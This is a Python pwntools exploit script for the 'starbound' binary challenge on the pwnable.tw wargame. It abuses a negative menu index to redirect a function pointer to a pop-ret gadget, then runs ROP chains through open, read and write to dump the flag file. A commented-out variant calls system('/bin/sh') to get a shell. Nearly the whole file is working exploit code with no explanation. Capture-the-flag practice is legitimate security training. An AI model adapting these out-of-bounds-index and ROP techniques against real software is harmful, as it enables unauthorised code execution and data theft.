from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']


pop_ret = 0x0804A6D9
name = 0x080580D0

# io = process("./starbound")
io = remote("chall.pwnable.tw", 10202)

elf = ELF("./starbound")
libc = ELF("./libc_32.so.6")

io.sendlineafter("> ", '6')
io.sendlineafter("> ", '2')
io.sendline(p32(pop_ret) + b'/home/starbound/flag\x00')


# gdb.attach(io, "b *0x0804a65d")

cnt = b"-33"

rop = flat(elf.plt['open'], elf.sym['main'], name+4, 0)

io.sendlineafter("> ", cnt.ljust(0xf8-0xe0, b'\x00') + rop)

io.sendlineafter("> ", '6')
io.sendlineafter("> ", '2')
io.sendline(p32(pop_ret) + b'/home/starbound/flag\x00')


rop = flat(elf.plt['read'], elf.sym['main'], 3, 0x8058500, 0x40)

io.sendlineafter("> ", cnt.ljust(0xf8-0xe0, b'\x00') + rop)

io.sendlineafter("> ", '6')
io.sendlineafter("> ", '2')
io.sendline(p32(pop_ret) + b'/home/starbound/flag\x00')

rop = flat(elf.plt['write'], elf.sym['main'], 1, 0x8058500, 0x40)

io.sendlineafter("> ", cnt.ljust(0xf8-0xe0, b'\x00') + rop)


# puts_got = u32(io.recv(4))
# log.info("puts: 0x%x", puts_got)
# libcbase = puts_got - 0x06cca0
# log.info("libc: 0x%x", libcbase)
# system = libcbase + 0x042410

# input()

# io.sendlineafter("> ", '6')
# io.sendlineafter("> ", '2')
# io.sendline(p32(pop_ret) + b'/bin/sh\x00')


# cnt = b"-33"

# rop = flat(system, 0xdeadbeef, name+4)

# io.sendlineafter("> ", cnt.ljust(0xf8-0xe0, b'\x00') + rop)

io.interactive()